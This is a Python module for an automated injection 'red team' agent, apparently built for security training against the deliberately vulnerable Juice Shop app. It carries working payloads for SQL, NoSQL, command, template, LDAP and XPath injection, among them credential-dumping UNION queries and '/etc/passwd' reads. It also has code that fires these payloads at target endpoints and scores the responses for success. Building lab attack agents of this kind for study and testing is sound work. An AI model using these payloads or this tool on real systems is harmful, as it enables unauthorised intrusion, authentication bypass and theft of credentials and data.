from typing import List, Dict, Any, Optional
from datetime import datetime
from uuid import UUID
import structlog
import httpx
import random

from agents.schemas import EpisodeContext, RedTeamAction
from agents.rag.memory import RAGMemory

logger = structlog.get_logger(__name__)


INJECTION_TECHNIQUES = [
    {
        "technique_id": "T1190",
        "name": "SQL Injection - Union Based",
        "owasp_category": "A03",
        "attack_type": "sql_injection_union",
        "category": "sql_injection",
        "endpoints": [
            "/api/products/search?q={payload}",
            "/api/users?id={payload}",
            "/rest/search?term={payload}",
            "/api/v1/items?category={payload}",
        ],
        "payloads": [
            "' UNION SELECT null,username,password FROM users--",
            "' UNION SELECT null,table_name,column_name FROM information_schema.columns--",
            "' UNION SELECT 1,sqlite_version(),3--",
            "' UNION SELECT null,version(),3--",
        ],
        "description": "Extract data via UNION-based SQL injection",
    },
    {
        "technique_id": "T1190",
        "name": "SQL Injection - Blind/Time-Based",
        "owasp_category": "A03",
        "attack_type": "sql_injection_blind",
        "category": "sql_injection",
        "endpoints": [
            "/api/products/{id}",
            "/api/users/{id}",
            "/rest/items/{id}",
        ],
        "payloads": [
            "1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--",
            "1' WAITFOR DELAY '0:0:5'--",
            "1 AND SLEEP(5)--",
        ],
        "description": "Detect SQL injection via time-based blind technique",
    },
    {
        "technique_id": "T1190",
        "name": "SQL Injection - Error Based",
        "owasp_category": "A03",
        "attack_type": "sql_injection_error",
        "category": "sql_injection",
        "endpoints": [
            "/api/search?q={payload}",
            "/api/filter?value={payload}",
        ],
        "payloads": [
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(VERSION(), FLOOR(RAND(0)*2)) x FROM information_schema.tables GROUP BY x) a)--",
        ],
        "description": "Extract data via error-based SQL injection",
    },
    {
        "technique_id": "T1190",
        "name": "NoSQL Injection - MongoDB",
        "owasp_category": "A03",
        "attack_type": "nosql_injection",
        "category": "nosql_injection",
        "endpoints": [
            "/api/users/login",
            "/api/auth/login",
            "/rest/users/find",
        ],
        "payloads": [
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
            {"email": "admin@test.com", "password": {"$gt": ""}},
            {"$where": "this.password == this.password"},
        ],
        "description": "Bypass authentication via NoSQL injection",
    },
    {
        "technique_id": "T1059.007",
        "name": "Command Injection",
        "owasp_category": "A03",
        "attack_type": "command_injection",
        "category": "command_injection",
        "endpoints": [
            "/api/admin/ping?host={payload}",
            "/api/tools/traceroute?target={payload}",
            "/api/utils/nslookup?domain={payload}",
            "/rest/admin/exec?cmd={payload}",
        ],
        "payloads": [
            "8.8.8.8; cat /etc/passwd",
            "8.8.8.8 && whoami",
            "8.8.8.8 | id",
            "`cat /etc/passwd`",
            "$(cat /etc/passwd)",
            "8.8.8.8; ls -la /",
        ],
        "description": "Execute arbitrary commands via shell injection",
    },
    {
        "technique_id": "T1059.007",
        "name": "Template Injection (SSTI)",
        "owasp_category": "A03",
        "attack_type": "template_injection",
        "category": "template_injection",
        "endpoints": [
            "/api/preview?template={payload}",
            "/api/render?name={payload}",
            "/rest/template/generate?input={payload}",
        ],
        "payloads": [
            "{{7*7}}",
            "{{config.__class__.__init__.__globals__}}",
            "{{''.__class__.__mro__[2].__subclasses__()}}",
            "#{7*7}",
            "${7*7}",
        ],
        "description": "Server-side template injection for RCE",
    },
    {
        "technique_id": "T1190",
        "name": "LDAP Injection",
        "owasp_category": "A03",
        "attack_type": "ldap_injection",
        "category": "ldap_injection",
        "endpoints": [
            "/api/users/search?name={payload}",
            "/rest/ldap/query?filter={payload}",
        ],
        "payloads": [
            "*)(uid=*",
            "admin)(&(password=*))",
            "*)(|(password=*))",
        ],
        "description": "LDAP injection for authentication bypass or data extraction",
    },
    {
        "technique_id": "T1190",
        "name": "XPath Injection",
        "owasp_category": "A03",
        "attack_type": "xpath_injection",
        "category": "xpath_injection",
        "endpoints": [
            "/api/xml/search?query={payload}",
            "/rest/xpath/query?expr={payload}",
        ],
        "payloads": [
            "' or '1'='1",
            "'] | //user/password | ['",
            "*] | //* | [",
        ],
        "description": "XPath injection for XML data extraction",
    },
]


class InjectionRedTeamAgent:
    def __init__(
        self,
        rag_memory: Optional[RAGMemory] = None,
        scenario: str = "injection",
        target_type: str = "juice_shop",
    ):
        self.rag = rag_memory
        self.scenario = scenario
        self.target_type = target_type
        self.techniques = INJECTION_TECHNIQUES
        self.technique_index = 0
        self.payload_index = 0
        self.client = httpx.AsyncClient(timeout=30.0, follow_redirects=True)

    async def select_action(self, state: EpisodeContext) -> Optional[RedTeamAction]:
        if self.technique_index >= len(self.techniques):
            logger.info("All injection techniques exhausted", episode_id=str(state.episode_id))
            return None

        technique = self.techniques[self.technique_index]

        if self.payload_index >= len(technique["payloads"]):
            self.technique_index += 1
            self.payload_index = 0
            return await self.select_action(state)

        payload = technique["payloads"][self.payload_index]
        self.payload_index += 1

        target_endpoint = self._select_endpoint(technique, state, payload)

        action = RedTeamAction(
            technique_id=technique["technique_id"],
            owasp_category=technique["owasp_category"],
            attack_type=technique["attack_type"],
            target_endpoint=target_endpoint,
            http_method="GET" if technique["category"] in ["sql_injection", "command_injection", "ldap_injection", "xpath_injection"] else "POST",
            payload=payload if isinstance(payload, dict) else {"payload": payload},
            headers={"Content-Type": "application/json"},
            expected_behavior=technique["description"],
        )

        return action

    def _select_endpoint(self, technique: Dict[str, Any], state: EpisodeContext, payload: Any) -> str:
        endpoints = technique.get("endpoints", ["/api/search?q=test"])
        endpoint = random.choice(endpoints)

        if "{payload}" in endpoint:
            if isinstance(payload, dict):
                endpoint = endpoint.replace("{payload}", "test")
            else:
                endpoint = endpoint.replace("{payload}", str(payload)[:100])

        return f"{state.target_url.rstrip('/')}{endpoint}"

    async def execute_action(self, action: RedTeamAction, target_url: str) -> Dict[str, Any]:
        try:
            full_url = action.target_endpoint
            if not full_url.startswith("http"):
                full_url = f"{target_url.rstrip('/')}{action.target_endpoint}"

            logger.info("Executing injection attack", url=full_url, technique=action.technique_id)

            if action.http_method == "GET":
                response = await self.client.get(full_url, params=action.payload, headers=action.headers)
            elif action.http_method == "POST":
                response = await self.client.post(full_url, json=action.payload, headers=action.headers)
            else:
                response = await self.client.request(
                    action.http_method, full_url, json=action.payload, headers=action.headers
                )

            success = self._check_injection_success(response, action.attack_type)

            result = {
                "success": success,
                "status_code": response.status_code,
                "response_body": response.text[:3000] if response.text else "",
                "response_headers": dict(response.headers),
                "technique_id": action.technique_id,
                "attack_type": action.attack_type,
                "timestamp": datetime.utcnow().isoformat(),
                "response_time_ms": response.elapsed.total_seconds() * 1000,
            }

            if success:
                logger.info("Injection successful", technique=action.technique_id, type=action.attack_type)
            else:
                logger.info("Injection failed", technique=action.technique_id, type=action.attack_type)

            return result

        except httpx.TimeoutException:
            return {"success": False, "error": "Timeout", "technique_id": action.technique_id}
        except httpx.ConnectError:
            return {"success": False, "error": "Connection failed", "technique_id": action.technique_id}
        except Exception as e:
            logger.error("Injection execution error", technique=action.technique_id, error=str(e))
            return {"success": False, "error": str(e), "technique_id": action.technique_id}

    def _check_injection_success(self, response: httpx.Response, attack_type: str) -> bool:
        if response.status_code >= 500:
            return True

        body = response.text.lower()
        elapsed = response.elapsed.total_seconds()

        if attack_type in ["sql_injection_union", "sql_injection_error"]:
            return any(kw in body for kw in [
                "sql", "syntax", "mysql", "postgresql", "sqlite", "version",
                "username", "password", "email", "table", "column",
                "extractvalue", "union select", "information_schema"
            ]) or elapsed > 4.0

        elif attack_type == "sql_injection_blind":
            return elapsed > 4.0

        elif attack_type == "nosql_injection":
            return any(kw in body for kw in [
                "token", "logged in", "welcome", "dashboard",
                "authenticated", "session"
            ]) and response.status_code == 200

        elif attack_type == "command_injection":
            return any(kw in body for kw in [
                "root:", "uid=", "gid=", "bin/bash", "bin/sh",
                "/etc/passwd", "/bin/", "total ", "drwx",
                "command not found", "permission denied"
            ])

        elif attack_type == "template_injection":
            return any(kw in body for kw in [
                "49", "__class__", "__mro__", "__subclasses__",
                "config", "globals", "builtins"
            ])

        elif attack_type in ["ldap_injection", "xpath_injection"]:
            return any(kw in body for kw in [
                "user", "password", "cn=", "ou=", "dc=",
                "objectclass", "uid="
            ]) and response.status_code == 200

        return False

    async def close(self):
        await self.client.aclose()